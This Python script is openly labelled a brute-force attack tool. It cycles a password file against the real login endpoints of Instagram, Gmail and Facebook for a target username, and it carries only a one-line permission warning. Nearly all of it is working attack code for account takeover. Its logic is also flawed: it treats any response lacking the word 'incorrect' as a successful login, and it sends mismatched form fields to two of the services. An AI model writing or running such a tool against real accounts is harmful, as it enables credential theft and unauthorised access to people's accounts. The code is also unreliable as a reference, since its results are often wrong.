#!/usr/bin/env python3
"""
Brute Force Attack Script for Common Login Services

WARNING: Only use on systems you have permission to test.

Requirements:
- Requests library (pip install requests)
"""

import requests
import time
import sys
import argparse

def login(service, username, password_file):
    """Attempts to login with each password in the provided file."""
    
    try:
        # Read all passwords from file
        with open(password_file, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        print(f"[+] Loaded {len(passwords)} passwords.")
        
        # Service-specific login URLs
        service_urls = {
            "instagram": "https://www.instagram.com/accounts/login/ajax/",
            "gmail":     "https://accounts.google.com/signin/v2/identifier",
            "facebook":  "https://www.facebook.com/login.php"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Common payloads for different services
        payloads = {
            "instagram": {"username": username, "password": ""},  # Password will be injected later
            "gmail":     {"identifierId": username},
            "facebook":  {"email": username}
        }
        
        if service not in service_urls:
            print(f"[!] Unsupported service: {service}")
            return False
        
        session = requests.Session()
        
        for password in passwords:
            payloads[service]["password"] = password
            
            try:
                # For Gmail, you need to submit a form first
                if service == "gmail":
                    time.sleep(1)  # Respect rate limiting
                    response = session.get(service_urls["gmail"])
                
                # Submit login request
                start_time = time.time()
                response = session.post(
                    service_urls[service], 
                    headers=headers,
                    data=payloads[service],
                    timeout=5
                )
                
                elapsed = time.time() - start_time
                
                # Analyze response
                if "incorrect" not in response.text.lower():
                    print(f"[SUCCESS] {username}:{password} (Time: {elapsed:.2f}s)")
                    return True
                
            except requests.Timeout:
                continue  # Skip timeouts, service might have locked
    
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Login brute force script")
    parser.add_argument("service", choices=["instagram", "gmail", "facebook"], help="Target service")
    parser.add_argument("--username", required=True, help="Account username/email")
    parser.add_argument("--password-file", required=True, help="File containing passwords")
    
    args = parser.parse_args()
    
    print(f"[*] Starting brute force on {args.service} for user: {args.username}")
    login(args.service, args.username, args.password_file)

if __name__ == "__main__":
    main()
